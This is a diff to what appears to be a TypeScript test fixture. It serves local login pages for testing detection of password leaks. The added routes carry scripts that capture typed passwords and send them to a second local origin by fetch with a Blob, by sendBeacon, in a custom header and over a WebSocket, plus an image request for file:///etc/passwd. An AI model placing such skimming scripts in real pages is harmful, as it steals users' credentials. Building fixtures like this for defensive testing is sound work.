@@ -1,4 +1,6 @@
-import { createServer, type Server } from 'node:http';
+import { createHash } from 'node:crypto';
+import { createServer, type IncomingMessage, type Server } from 'node:http';
+import type { Duplex } from 'node:stream';
 
 type Origins = Readonly<{ primary: string; secondary: string }>;
 type Route = (origins: Origins) => string;
@@ -126,6 +128,26 @@ export const CONTROL_LAB_ROUTES = Object.freeze({
       new Image().src = '${secondary}/pixel?p=' + this.value;
     });
   </script>`,
+  '/file-request': () => `${loginForm()}<img src="file:///etc/passwd">`,
+  '/blob-leak': ({ secondary }) => `${loginForm()}<script>
+    document.querySelector('#password').addEventListener('input', function () {
+      fetch('${secondary}/blob-fetch', { method: 'POST', body: new Blob([this.value]) }).catch(() => {});
+      navigator.sendBeacon('${secondary}/blob-beacon', new Blob([this.value]));
+    });
+  </script>`,
+  '/header-leak': ({ secondary }) => `${loginForm()}<script>
+    document.querySelector('#password').addEventListener('input', function () {
+      fetch('${secondary}/header-receive', { headers: { 'x-tv-leak': this.value } }).catch(() => {});
+    });
+  </script>`,
+  '/ws-leak': ({ secondary }) => `${loginForm()}<script>
+    var socket = new WebSocket('${secondary.replace('http:', 'ws:')}/ws-receive');
+    document.querySelector('#password').addEventListener('input', function () {
+      var value = this.value;
+      if (socket.readyState === WebSocket.OPEN) socket.send(value);
+      else socket.addEventListener('open', () => socket.send(value), { once: true });
+    });
+  </script>`,
 } satisfies Record<string, Route>);
 
 export type ControlsLab = Readonly<{
@@ -145,8 +167,10 @@ export async function startControlsLab(): Promise<ControlsLab> {
     }));
     serve(request.url, response, () => origins);
   });
+  attachWebSocketServer(secondary, secondaryRequests);
   const secondaryOrigin = await listen(secondary);
   const primary = createServer((request, response) => serve(request.url, response, () => origins));
+  attachWebSocketServer(primary, []);
   let primaryOrigin: string;
   try {
     primaryOrigin = await listen(primary);
@@ -178,11 +202,49 @@ function serve(
   }
   const route = CONTROL_LAB_ROUTES[path as keyof typeof CONTROL_LAB_ROUTES];
   response.setHeader('content-type', 'text/html; charset=utf-8');
+  response.setHeader('access-control-allow-origin', '*');
+  response.setHeader('access-control-allow-headers', 'x-tv-leak');
+  response.setHeader('access-control-allow-methods', 'GET, POST, OPTIONS');
+  if (response.req.method === 'OPTIONS') {
+    response.statusCode = 204;
+    response.end();
+    return;
+  }
   response.statusCode = route === undefined ? 404 : 200;
   response.end(document(
     route === undefined ? '<main>not found</main>' : route(getOrigins()),
     path === '/static-token-login' ? 'data-tv-document="static-document"' : '',
   ));
+}
+
+function attachWebSocketServer(server: Server, requests: LabRequest[]): void {
+  server.on('upgrade', (request: IncomingMessage, socket: Duplex) => {
+    const key = request.headers['sec-websocket-key'];
+    if (typeof key !== 'string') {
+      socket.destroy();
+      return;
+    }
+    requests.push(Object.freeze({
+      method: request.method ?? '',
+      path: new URL(request.url ?? '/', 'http://fixture.invalid').pathname,
+    }));
+    const accept = createHash('sha1')
+      .update(`${key}258EAFA5-E914-47DA-95CA-C5AB0DC85B11`)
+      .digest('base64');
+    socket.write([
+      'HTTP/1.1 101 Switching Protocols',
+      'Upgrade: websocket',
+      'Connection: Upgrade',
+      `Sec-WebSocket-Accept: ${accept}`,
+      '',
+      '',
+    ].join('\r\n'));
+    socket.on('data', () => undefined);
+    const tracked = upgradedSockets.get(server) ?? new Set<Duplex>();
+    tracked.add(socket);
+    upgradedSockets.set(server, tracked);
+    socket.on('close', () => { tracked.delete(socket); });
+  });
 }
 
 function loginForm(
@@ -244,6 +306,12 @@ function listen(server: Server): Promise<string> {
   });
 }
 
+// Upgraded (WebSocket) sockets leave the http server's connection list, so server.close() would wait on them
+// forever; they are tracked per server and destroyed first (the afterAll hook timed out without this).
+const upgradedSockets = new WeakMap<Server, Set<Duplex>>();
+
 function closeServer(server: Server): Promise<void> {
+  for (const socket of upgradedSockets.get(server) ?? []) socket.destroy();
+  server.closeAllConnections();
   return new Promise((resolve, reject) => server.close((error) => error ? reject(error) : resolve()));
 }
